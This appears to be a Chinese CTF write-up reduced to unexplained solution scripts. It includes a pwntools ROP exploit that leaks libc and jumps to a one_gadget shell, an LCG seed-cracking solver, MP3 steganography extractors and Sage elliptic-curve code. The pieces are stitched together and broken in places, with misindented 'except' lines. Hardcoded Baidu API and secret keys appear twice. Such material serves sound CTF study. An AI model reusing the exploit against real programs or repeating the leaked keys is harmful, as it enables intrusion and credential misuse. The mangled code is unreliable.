libc=ELF('libc.so.6')
buf=0x6010A0+0X100
print hex(buf)
    #puts_plt=elf.plt['puts']
puts_plt=0x400520
puts_got=elf.got['puts']
    #read_plt=elf.plt['read']
read_plt=0x400530
main=0x40071A

leve_ret=0x00400718
popret=0x00000000004007a3

payload='A'*0x100+p64(buf)+p64(popret)+p64(puts_got)+p64(puts_plt)+p64(main)

p.recvuntil('your name:n')
p.send(payload)

p.recvuntil('your data:n')
payload1='a'*0x70+p64(buf)+p64(leve_ret)

    #gdb.attach(p,'b *0x40060F')
    #raw_input()

p.send(payload1)

    #p.recv()

putsadd=u64(p.recvuntil('n',drop=True).ljust(0x8,'x00'))
print hex(putsadd)

libc_base = putsadd- libc.sym['puts']
one_gadget = libc_base +0xf03a4
p.recv()
p.send("1")
p.recv()
pay= 0x78*'a' + p64(one_gadget)*4
p.send(pay)
p.interactive()
size_r=src.size;
ptr_r=src.ptr;
check(src,dst);
free(dst.ptr);
src.size=0;src.ptr=0;
dst.size=size_r;dst.ptr=src_r;
//src=dst时，会导致dst的ptr指向已释放的区域，且dst.size=0
struct Table {
    struct GCObject *next;
    lu_byte tt;
    lu_byte marked;
    lu_byte flags;
    lu_byte lsizenode;
    unsigned int alimit;
    TValue *array;
    Node *node; /*     24      |       8 */
    Node *lastfree;
    struct Table *metatable;
    GCObject *gclist;
}
from PIL import Image
import os
from aip import AipSpeech
from subprocess import *
from tqdm import tqdm  
import pickle 
import io 

def load_mp3(folder):
    '''
    加载文件夹下的mp3
    '''
    mp3list = []
    # img=[]
    for mp3 in os.listdir(folder):
        ext = os.path.splitext(mp3)
        # if len(ext) > 1 and is_img(ext[1]):
        if ext[1] == '.mp3' :
            filename=folder+mp3
            mp3list.append(filename)
            # img.append(mp3)

    return mp3list

def getimage(mp3file):
    with open(mp3file,'rb') as f:
        fr=f.read()
    offset=int.from_bytes(fr[14:18],'big')
    fr1=fr[20:20+offset]
    fr1=fr1[13:]
    img=io.BytesIO(fr1)
    img=Image.open(img)
    return img
    pass

def main():

    num_dict={"0":u"零","1":u"一","2":u"二","3":u"三","4":u"四","5":u"五","6":u"六","7":u"七","8":u"八","9":u"九"}
    new_dict={v:k for k,v in num_dict.items()}
    print(num_dict)
    print(new_dict)  #互换键值
    set1=set('0123456789'+''.join([i for i in new_dict]))
    set2=set('0123456789')

    mp3list=load_mp3('./random/')

    dict1={}
    for i,mp3 in tqdm(enumerate(mp3list)):    #把mp3转换成wav，百度aip对wav支持较好
        wavname='./wav/'+os.path.split(mp3)[1].split('.')[0]+'.wav'
        indexname=os.path.split(mp3)[1].split('.')[0]
        cmd="ffmpeg.exe -i {} -f wav -ac 1 -ar 16000 {}".format(mp3,wavname)   #调用ffmpeg.exe

        p=Popen(cmd,shell=True,stdout=open("process.out", "w"), close_fds=True)
        p.wait()

        with open(wavname, 'rb') as f:
            fp= f.read()
            # 识别本地文件
        try:
            result = client.asr(fp, 'wav', 16000, {'dev_pid': 1537})
# 默认1537（普通话 输入法模型），dev_pid参数见本节开头的表格
            tmp=result['result'][0][:-1]
            if set(tmp).issubset(set2):
                dict1[indexname]=int(tmp)
            elif    set(tmp).issubset(set1):
                tmp1=''
                for j in tmp:
                    if j in set2:
                        tmp1+=j
                    else:
                        tmp1+=new_dict[j]
                dict1[indexname]=int(tmp1)
            else:
                dict1[indexname]=tmp
        
except Exception as e:
            print(e)
            print("./wav/{}.wav".format(i))
    pass
    dict2={v:k for k,v in dict1.items()}   #互换键值
    print(dict2)
    for i in range(0,625):
        try:
            dict2[i]
        
except Exception as e:
            print(e)
            print(i,'不存在')
    pick_file = open('dict2.pickle','wb')
    pickle.dump(dict2,pick_file)
    pick_file.close()

    pick_file = open('dict1.pickle','wb')
    pickle.dump(dict1,pick_file)
    pick_file.close()

APP_ID = '26805318' 
API_KEY = 'zXkQ4cEEVHPHLSoEjqLgevqQ' 
SECRET_KEY = '7GptONVCNLblYqwevUq6YzgFLPOO1i4B' 

client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)

wavpath='./wav/'     #调试数据所在目录
if not os.path.exists(wavpath):
    os.mkdir(wavpath)

if  not os.path.exists('dict2.pickle'):
    main()      #如果没有转换成wav,需要先转换一次,然后得到pickle
else:            #直接读取pickle
    pickfile = open('dict2.pickle','rb')
    dictfile2 = pickle.load(pickfile)
    print(dictfile2)
    pickfile = open('dict1.pickle','rb')
    dictfile1 = pickle.load(pickfile)
    print(dictfile1)
    pass

img1=Image.new('RGB',(2500,2500),'white')  #新建底图
for i in range(0,625):
    try:
        mp3num=dictfile2[i]
        mp3file='./random/'+mp3num+'.mp3'
        img=getimage(mp3file)    #提取mp3中的图片
        x=(i%25)*100
        y=(i//25)*100
        img1.paste(img,(x,y))
    
except Exception as e:
        print(e)
        print(i,'没有找到')
img1.save('tmp.png')
img1.show()
pass
import pickle
import os 

def load_mp3(folder):
    '''
    加载文件夹下的mp3
    '''
    mp3list = []
    # img=[]
    for mp3 in os.listdir(folder):
        ext = os.path.splitext(mp3)
        # if len(ext) > 1 and is_img(ext[1]):
        if ext[1] == '.mp3' :
            filename=folder+mp3
            mp3list.append(filename)
            # img.append(mp3)

    return mp3list

def getFrameoffset(fr):
    tmp=''
    for i in fr:
        tmp+=bin(i)[2:].zfill(7)
    pass
    return int(tmp,2)

def getpadding(mp3):
    with open(mp3,'rb')as f:
        fr=f.read()
    offset=getFrameoffset(fr[6:10])+10
    padding=fr[offset-4096:
offset]
    if set(padding)=={0}:    #全为0说明padding里头没有数据
        print('no mp3 inside')
        return None,fr
    else:                    #说明padding里头有东西,我们从非0开始取数据,发现是mp3
        for i,data in enumerate(padding):
            if data!=0:
                newmp3=padding[i:]
                return newmp3,fr
    pass

pickfile = open('dict2.pickle','rb')
dictfile2 = pickle.load(pickfile)
print(type(dictfile2),dictfile2)
print(100*'*')
pickfile = open('dict1.pickle','rb')
dictfile1 = pickle.load(pickfile)
print(type(dictfile1),dictfile1)

if not os.path.exists('./存在padding的文件/'):
    os.mkdir('./存在padding的文件/')

mp3list=load_mp3('./random/')
for i,mp3 in enumerate(mp3list):
    n=os.path.split(mp3)[1].split('.')[0]
    newmp3,mp3file=getpadding(mp3)
    if newmp3:   #padding中存在mp3
        open('./存在padding的文件/{}-{}-padding.mp3'.format(dictfile1[n],n),'wb').write(newmp3)
        open('./存在padding的文件/{}-{}.mp3'.format(dictfile1[n],n),'wb').write(mp3file)
    else:
        continue
    pass
import os
from aip import AipSpeech
from subprocess import *

def load_mp3(folder):
    '''
    加载文件夹下的mp3
    '''
    mp3list = []
    dict1={}
    for mp3 in os.listdir(folder):
        ext = os.path.splitext(mp3)

        if ext[1] == '.mp3' and 'padding' in mp3:
            id=int(ext[0].split('-')[0])
            filename=folder+mp3
            mp3list.append(filename)
            dict1[id]=filename

    return mp3list,dict1

APP_ID = '26805318' 
API_KEY = 'zXkQ4cEEVHPHLSoEjqLgevqQ' 
SECRET_KEY = '7GptONVCNLblYqwevUq6YzgFLPOO1i4B' 

client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)

mp3dict=load_mp3('./存在padding的文件/')[1]

wavpath='./flagwav/'     #调试数据所在目录
if not os.path.exists(wavpath):
    os.mkdir(wavpath)

res=[]
for i in range(48):
    wavname='./flagwav/'+str(i)+'.wav'

    cmd="ffmpeg.exe -i {} -f wav -ac 1 -ar 16000 {}".format(mp3dict[i],wavname)   #调用ffmpeg.exe

    p=Popen(cmd,shell=True,stdout=open("process.out", "w"), close_fds=True)
    p.wait()

    with open(wavname, 'rb') as f:
        fp= f.read()
        # 识别本地文件
    try:
        result = client.asr(fp, 'wav', 16000, {'dev_pid': 1737})
# 默认1537（普通话 输入法模型），1737是英语
        tmp=result['result'][0][:-1]
        res.append((i,tmp))
        # print(tmp,end='')
    
except Exception as e:
        print(e)
open("结果识别.txt",'w').write(''.join([str(i)+'n' for i in res]))
zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi
import string
from base64 import * 

ss=set('abcdef'+string.digits+'flag{}-')
text1='zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi'   #因为数量不多,我们尝试用耳朵听出来

def alls(text):
    res=[""]
    for i in (text):
        if not i.isalpha():
            for j in range(len(res)):
                res[j] += i
        else:
            for k in range(len(res)):
                tmp = res[k]
                res[k] += i.lower()
                res.append(tmp + i.upper())
    return res

for i in range(0,len(text1),4):
    t=(text1[i:i+4])
    res=alls(t)
    for j in res:
        try:
            tmp=b64decode(j.encode()).decode()
            if set(tmp).issubset(ss):  #字符串是0-9a-fflag{}-的子集的话,即uuid格式
                print(tmp,end='')

        
except Exception as e:
            continue
# print(tmp)
已知a,b,N,num1
num1 = (seed *a + b ) % N
由于b比N小则
num1 - b = seed * a % N
由于取模，则需要模数逆推
seed = (num1-b)*inverse(a,N)%N
def solve1(N,a,b,n1):
    return (n1-b)*inverse(a,N) % N
已知a,N,num1,num2
需要先通过num1,num2求出b
由于num2 = (num1 *a + b ) % N
b = (n2-n1 * a)%N
然后再带入def solve1()就行
def solve2(N,a,n1,n2):
    b = (n2-n1 * a)%N
    return solve1(N,a,b,n1)
这次只知道num1,num2,num3,N
需要求出a然后带入solve2中求出b
num3 = (num2*a + b) %N
num2 = (num1*a + b) %N
->
num3-b = num2*a % N
num2-b = num1*a % N
->
num3 - num2 = num2*a % N - num1*a %N
->
num3 - num2 = a*(num2-num1) % N
->
a = (num3-num2)*inverse(num2-num1,N) %N
def solve3(N,n1,n2,n3):
    a = (n3-n2)*inverse(n2-n1,N) %N
    return solve2(N,a,n1,n2)
只知道6个连续的随机数,这次就不能用线性方程组了,因为对与每一个方程,它的模数都是未知的.
5个方程就会多出5个未知数
但是如果多个随机数分别乘n,那么gcd就可能等于n
我们可以设置几个模0式,然后进行gcd运算,可以在模数未知的情况下通过多个未知数序列算出模数

跟solve3有类似的地方
s1 = num2-num1 ->(num2*a+b) -(num1*a+b) = a*(num2-num1) = a*s1 %N
s2 = num3-num2 ->(num3*a+b) -(num2*a+b) = a*(num3-num2) = a*s2 %N
s3 = num4-num3
s4 = num5-num4
s5 = num6-num5
那么t1-6就有共同的模数
再做出模0式,可以互乘再做差
t3*t1-t2**2
t5*t2-t4*t3
然后进行gcd求n
N = GCD(t3*t1-t2**2,t5*t2-t4*t3)
但是此时的N不一定是素数,只是接近true_N,那么就可以用光滑阶进行求解
F = factorint(N)
F.items() -> p,q
N = N / pow(p,q)
def solve4(num1,num2,num3,num4,num5,num6):
    s1 = num2-num1
    s2 = num3-num2
    s3 = num4-num3
    s4 = num5-num4
    s5 = num6-num5
    N = GCD(s3*s1-s2**2,s5*s2-s4*s3)
    F = factorint(N)
    while 1:
        if isPrime(int(N)):
            return solve3(N,num1,num2,num3)
        else:
            for p,q in F.items():
                if p.bit_length()>128:
                    continue
                N = N/pow(p,q)
from pwn import *
from sympy import factorint
from Crypto.Util.number import *
context.log_level = 'debug'
    #io = remote("0.0.0.0",10000)

def solve1(N,a,b,num1):
    return (num1-b)*inverse(a,N) % N
def solve2(N,a,num1,num2):
    b = (num2-num1 * a)%N
    return solve1(N,a,b,num1)
def solve3(N,num1,num2,num3):
    a = (num3-num2)*inverse(num2-num1,N) %N
    return solve2(N,a,num1,num2)
def solve4(num1,num2,num3,num4,num5,num6):
    s1 = num2-num1
    s2 = num3-num2
    s3 = num4-num3
    s4 = num5-num4
    s5 = num6-num5
    N = GCD(s3*s1-s2**2,s5*s2-s4*s3)
    F = factorint(N)
    while 1:
        if isPrime(int(N)):
            return solve3(N,num1,num2,num3)
        else:
            for p,q in F.items():
                if p.bit_length()>128:
                    continue
                N = N/pow(p,q)

def challenge1():
    io.recvuntil("a=")
    a = int(io.recvline().strip())
    io.recvuntil("b=")
    b = int(io.recvline().strip())
    io.recvuntil("N=")
    N = int(io.recvline().strip())
    io.recvuntil("num1=")
    num1 = int(io.recvline().strip())
    seed = solve1(N,a,b,num1)
    io.recvuntil("seed = ")
    io.sendline(str(seed))

def challenge2():
    io.recvuntil("a=")
    a = int(io.recvline().strip())
    io.recvuntil("N=")
    N = int(io.recvline().strip())
    io.recvuntil("num1=")
    num1 = int(io.recvline().strip())
    io.recvuntil("num2=")
    num2 = int(io.recvline().strip())
    seed = solve2(N,a,num1,num2)
    io.recvuntil("seed = ")
    io.sendline(str(seed))

def challenge3():
    io.recvuntil("N=")
    N = int(io.recvline().strip())
    io.recvuntil("num1=")
    num1 = int(io.recvline().strip())
    io.recvuntil("num2=")
    num2 = int(io.recvline().strip())
    io.recvuntil("num3=")
    num3 = int(io.recvline().strip())
    seed = solve3(N,num1,num2,num3)
    io.recvuntil("seed = ")
    io.sendline(str(seed))

def challenge4():
    io.recvuntil("num1=")
    num1 = int(io.recvline().strip())
    io.recvuntil("num2=")
    num2 = int(io.recvline().strip())
    io.recvuntil("num3=")
    num3 = int(io.recvline().strip())
    io.recvuntil("num4=")
    num4 = int(io.recvline().strip())
    io.recvuntil("num5=")
    num5 = int(io.recvline().strip())
    io.recvuntil("num6=")
    num6 = int(io.recvline().strip())
    seed = solve4(num1,num2,num3,num4,num5,num6)
    io.recvuntil("seed = ")
    io.sendline(str(seed))
for i in range(50):
    challenge1()
    print(i)
for i in range(30):
    challenge2()
    print(i)
for i in range(20):
    challenge3()
    print(i)
challenge4()

io.interactive()
from Crypto.Util.number import *

p = 101202160159081561029549739902097099275439197324107563340103725793005952286427
a = 77352628233208904456190113484930965015529164818065903310716894212030514274681
g = 60481606253840272416608492349866939317114665311741132450767745324720776050313

with open('output.txt', 'r') as f:
    data = f.readlines()
    G = eval(data[0])
    Q = eval(data[1])
    leak = eval(data[2])

Qpp = Qp(p, prec=666)
s2 = (Qpp(leak).log() / Qpp(g).log()).lift()
print(long_to_bytes(s2))

b = (G[1]^2 - G[0]^3 - a*G[0]) % p^5

Fp5 = Zmod(p^5)
E = EllipticCurve(Fp5, [a, b])

p_ord = E.change_ring(GF(p)).order()

EQp = E.change_ring(Qp(p))
QpG = EQp(G) * p_ord
QpQ = EQp(Q) * p_ord

phiG = -QpG[0] / QpG[1]
phiQ = -QpQ[0] / QpQ[1]

s1 = ZZ(phiQ / phiG)
print(long_to_bytes(s1))
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1668733182.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1668733183.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/5-1668733183.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1668733185.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1668733186.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1668733187.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1668733188.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1668733189.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1668733189.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1668733190.png)